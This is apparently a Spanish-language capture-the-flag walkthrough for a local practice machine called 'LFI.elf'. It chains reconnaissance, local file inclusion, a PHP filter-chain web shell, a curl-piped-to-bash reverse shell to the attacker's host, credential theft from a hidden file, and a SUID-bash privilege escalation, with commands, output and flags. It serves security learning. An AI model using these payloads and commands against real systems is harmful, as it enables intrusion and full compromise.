---
icon: flag
---

# CTF LFI.elf Easy

URL Download CTF = [https://drive.google.com/file/d/11bz5RKPRZTrsY79R1VfRodKUhUhWgEJ7/view?usp=sharing](https://drive.google.com/file/d/11bz5RKPRZTrsY79R1VfRodKUhUhWgEJ7/view?usp=sharing)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip lfi.elf.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh lfi.elf.tar
```

Info:

```
___________________¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5

                                           
 ##   ##    ##       ####   ###  ##  #######  ######   ####       ##     ######    #####  
 ##   ##   ####     ##  ##   ##  ##   ##   #   ##  ##   ##       ####     ##  ##  ##   ## 
 ##   ##  ##  ##   ##        ## ##    ## #     ##  ##   ##      ##  ##    ##  ##  #       
 #######  ##  ##   ##        ####     ####     #####    ##      ##  ##    #####    #####  
 ##   ##  ######   ##        ## ##    ## #     ## ##    ##   #  ######    ##  ##       ## 
 ##   ##  ##  ##    ##  ##   ##  ##   ##   #   ##  ##   ##  ##  ##  ##    ##  ##  ##   ## 
 ##   ##  ##  ##     ####   ###  ##  #######  #### ##  #######  ##  ##   ######    #####  
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.18.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-17 06:15 EDT
Nmap scan report for 172.18.0.2
Host is up (0.000031s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: CTF LFI.elf
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:12:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.71 seconds
```

Por lo que vemos hay una pagina web, entrando en ella vemos muchas cosas e informacion innecesaria, pero a parte de en algunas partes decirlos lo que hace un `LFI (Local File Inclusion)` tambien lo pone en el propio nombre de la maquina, por lo que tiraremos por ahi probando suerte con el `index.php`.

Pero antes si hacemos una busqueda de direcotios.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.18.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/assets               (Status: 200) [Size: 1113]
/downloads.php        (Status: 200) [Size: 1001]
/faq.php              (Status: 200) [Size: 1118]
/index.php            (Status: 200) [Size: 978]
/login.php            (Status: 200) [Size: 1155]
/missions.php         (Status: 200) [Size: 1033]
/pages                (Status: 200) [Size: 1336]
/report.php           (Status: 200) [Size: 941]
/secret.txt           (Status: 200) [Size: 323]
/server-status        (Status: 403) [Size: 275]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Como dije veremos varias cosas, pero entre todas las que mas atrae es el directorio llamado `/secret.txt`.

Si nos metemos dentro veremos lo siguiente.

```
agent lin,

I have encrypted this message so that you can see it alone, 
I need you to help me with a super secret mission, 
but I can't tell you the credentials yet, 
you will have to see them yourself, 
prepare something inside the page so that you can see them easily you just have to search more.

Good luck agent lin.
```

Por lo que nos da una pista de que busquemos, asi que ahora si, buscaremos por el `index.php` si hubiera algun parametro vulnerable.

## FUZZ

```shell
ffuf -u http://<IP>/index.php\?FUZZ\=/etc/passwd -w <WORDLIST> -fs 978
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.18.0.2/index.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 978
________________________________________________

search                  [Status: 200, Size: 1257, Words: 36, Lines: 33, Duration: 0ms]
:: Progress: [20469/20469] :: Job [1/1] :: 9090 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```

Vemos que hay un parametro llamado `search` que es vulnerable a ello, por lo que haremos lo siguiente.

## LFI (Local File Inclusion)

Si en la URL ponemos lo siguiente veremos el archivo `passwd`.

```
URL = http://<IP>/index.php?search=/etc/passwd
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
lin:x:1001:1001:lin,,,:/home/lin:/bin/bash
```

Por lo que vemos lo saca bien, asi que vamos a utilizar `wrappers` en este `LFI` para podernos hacer un parametro llamado `CMD` y asi poder ejecutar comando para obtener una shell.

### Wrapper con LFI

URL\_Script = https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit/blob/main/filters\_chain\_oracle\_exploit.py

Si queremos por ejemplo crear un parametro llamado `cmd` que ejecute cualquier comando que le pongamos, seria de la siguiente forma...

```
$ python3 php_filter_chain_generator.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'
[+] The following gadget chain will generate the following code : <?php echo shell_exec($_GET["cmd"]);?> (base64 value: PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWyJjbWQiXSk7Pz4)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Copiamos eso y lo metemos despues del igual de la siguiente manera...

```
URL = http://<IP>/index.php?cmd=ls -la&search=<CONTENT_GENERATE>
```

Info:

```
total 44
drwxr-xr-x 4 root root 4096 Aug 16 14:53 .
drwxr-xr-x 4 root root 4096 Aug 16 17:38 ..
drwxr-xr-x 4 root root 4096 Aug 16 13:57 assets
-rw-r--r-- 1 root root 1001 Aug 16 14:46 downloads.php
-rw-r--r-- 1 root root 1118 Aug 16 14:46 faq.php
-rw-r--r-- 1 root root  570 Aug 16 14:42 index.php
-rw-r--r-- 1 root root 1155 Aug 16 14:46 login.php
-rw-r--r-- 1 root root 1033 Aug 16 14:45 missions.php
drwxr-xr-x 2 root root 4096 Aug 16 14:18 pages
-rw-r--r-- 1 root root  941 Aug 16 14:47 report.php
-rw-r--r-- 1 root root  323 Aug 16 14:53 secret.txt
```

Veremos que funciona, por lo que haremos lo siguiente.

### Reverse Shell

Primero vamos a comprobar que tenga la herramienta `curl` instalada en la maquina victima.

```
URL = http://<IP>/index.php?cmd=curl http://<IP_HOST>/test&search=<CONTENT_GENERATE>
```

Estando a la escucha para saber que te llega el mensaje del envio del comando desde la maquina victima...

```shell
python3 -m http.server 80
```

Si al enviar el comando con `curl` llega un mensaje al comando de `python3` significa que la herramienta esta instalada, por lo que podremos hacer lo siguiente...

```shell
nano index.html

#Contenido del nano

#!/bin/bash

bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Guardamos el archivo y ahora lo ejecutaremos desde `curl` en la maquina victima haciendo lo siguiente...

Donde tengamos el archivo abrimos un servidor de `python3` de la siguiente manera...

```shell
python3 -m http.server 80
```

Una vez hecho eso, estaremos a la escucha...

```shell
nc -nlvp <PORT>
```

Y por ultimo lo ejecutaremos con `curl` de la siguiente forma en la maquina victima...

```
URL = http://<IP>/index.php?cmd=curl http://<IP>/ | bash&search=<CONTENT_GENERATE>
```

Info:

```
connect to [192.168.5.145] from (UNKNOWN) [172.18.0.2] 51456
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
www-data@e3e9141342e3:/var/www/html$
```

Y con esto ya tendriamos la shell autenticada como `www-data`.

## Escalate user lin

Si nos vamos al siguiente directorio...

```shell
cd /var/www
ls -la
```

Veremos un directorio llamado `.secret_www-data` y si nos metemos dentro.

```
total 16
drwxr-xr-x 3 root root 4096 Aug 16 17:37 .
drwxr-xr-x 4 root root 4096 Aug 16 17:38 ..
drwxr-xr-x 2 root root 4096 Aug 16 17:37 .passwd
-rw-r--r-- 1 root root  889 Aug 16 17:37 agenda.txt
```

Pero el archivo `agenda.txt` no sirve de mucho, el que si interesa es `.passwd`.

```
total 12
drwxr-xr-x 2 root root 4096 Aug 16 17:37 .
drwxr-xr-x 3 root root 4096 Aug 16 17:37 ..
-rw-r--r-- 1 root root   21 Aug 16 17:37 passwords.txt
```

Por lo que leeremos el archivo.

```
lin:agentelinsecreto
```

Vemos las credenciales de `lin` por lo que cambiaremos a el haciendo lo siguiente.

```shell
su lin
```

Metemos como password `agentelinsecreto` y ya seriamos el.

## Escalate Privileges

Sanitizaremos la shell (TTY), para que no nos de problemas.

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Y seguimos con la escalada, leeremos la flag.

> user.txt

```
ed87c5c288f4909dde74cd499acbce92
```

Vemos que en el mismo directorio `/home` del usuario `lin` hay un archivo `.py` bastante interesante, si lo ejecutamos vemos lo siguiente.

```shell
python3 sistem.py
```

Info:

```
[MENU] Elija una opción:
  1. Mostrar información del sistema
  2. Realizar tarea
  3. Ejecutar módulo subthreads
  4. Salir
  Opción: 1
1
[INFO] Sistema y Entorno:
  Sistema Operativo: Linux 6.8.11-amd64
  Arquitectura: x86_64
  Usuario Actual: No disponible
[MENU] Elija una opción:
  1. Mostrar información del sistema
  2. Realizar tarea
  3. Ejecutar módulo subthreads
  4. Salir
  Opción: 2
2
[INFO] Realizando tarea...
  Tarea completada.
[MENU] Elija una opción:
  1. Mostrar información del sistema
  2. Realizar tarea
  3. Ejecutar módulo subthreads
  4. Salir
  Opción: 3
3
Error: No se pudo ejecutar el archivo.
[MENU] Elija una opción:
  1. Mostrar información del sistema
  2. Realizar tarea
  3. Ejecutar módulo subthreads
  4. Salir
  Opción: 4
4
Saliendo...
```

Si leemos el codigo por dentro.

```python
import os
import subprocess
import subthreads

def display_system_info():
    print("[INFO] Sistema y Entorno:")
    print(f"  Sistema Operativo: {os.uname().sysname} {os.uname().release}")
    print(f"  Arquitectura: {os.uname().machine}")
    try:
        print(f"  Usuario Actual: {os.getlogin()}")
    except OSError:
        print("  Usuario Actual: No disponible")

def perform_task():
    print("[INFO] Realizando tarea...")
    
    print("  Tarea completada.")

def main():
    while True:
        print("[MENU] Elija una opción:")
        print("  1. Mostrar información del sistema")
        print("  2. Realizar tarea")
        print("  3. Ejecutar módulo subthreads")
        print("  4. Salir")
        option = input("  Opción: ")
        
        if option == '1':
            display_system_info()
        elif option == '2':
            perform_task()
        elif option == '3':
            subthreads.execute()
        elif option == '4':
            print("Saliendo...")
            break
        else:
            print("Opción no válida. Inténtelo de nuevo.")

if __name__ == "__main__":
    main()
```

Vemos que esta importando un modulo bastante raro llamado `subthreads` un modulo que no suele ser muy comun, por lo que lo buscaremos.

```shell
find / -name 'subthreads*' 2>/dev/null
```

Info:

```
/usr/local/lib/python3.12/dist-packages/subthreads.py
/usr/local/lib/python3.12/dist-packages/__pycache__/subthreads.cpython-312.pyc
```

Vemos que existe un `.py` del modulo, veremos que tiene dentro de ese modulo y como funciona.

```shell
cat /usr/local/lib/python3.12/dist-packages/subthreads.py
```

Info:

```python
import subprocess

def execute():
    try:
        # Intenta ejecutar el archivo en /tmp
        result = subprocess.run(['/usr/bin/sudo', '/tmp/script.sh'], capture_output=True, text=True)
        
        # Verifica si el comando se ejecutó correctamente
        if result.returncode != 0:
            print("Error: No se pudo ejecutar el archivo.")
    except FileNotFoundError:
        # Muestra un mensaje genérico si el archivo no se encuentra
        print("Error: El archivo no se encuentra en /tmp.")
    except Exception as e:
        # Muestra un mensaje genérico para cualquier otra excepción
        print("Error: Ocurrió un problema al intentar ejecutar el archivo.")
```

Vemos que llama a un archivo llamado `script.sh` en la carpeta de `/tmp` y lo ejecuta como `sudo`, pero si vamos a `tmp` no veremos dicho archivo, lo crearemos poniendo lo siguiente para ser `root`.

```shell
nano /tmp/script.sh

#Dentro del nano
#!/bin/bash
chmod u+s /bin/bash
```

```shell
chmod +x /tmp/script.sh
```

Y ahora ejecutamos el script `sistem.py` y seleccionamos el numero 3, ya que es el que ejecuta ese `script.sh`.

```shell
python3 sistem.py
```

Info:

```
[MENU] Elija una opción:
  1. Mostrar información del sistema
  2. Realizar tarea
  3. Ejecutar módulo subthreads
  4. Salir
  Opción: 3
[MENU] Elija una opción:
  1. Mostrar información del sistema
  2. Realizar tarea
  3. Ejecutar módulo subthreads
  4. Salir
  Opción: 4
Saliendo...
```

Una vez hecho eso si vemos que permisos tiene la `bash`.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31 10:41 /bin/bash
```

Vemos que tiene los permisos de `SUID` por lo que haremos lo siguiente.

```shell
bash -p
```

Y con esto ya seremos `root`, por lo que leeremos la flag.

> root.txt

```
2d264e1f92a8230d442750d69fba4cc5
```
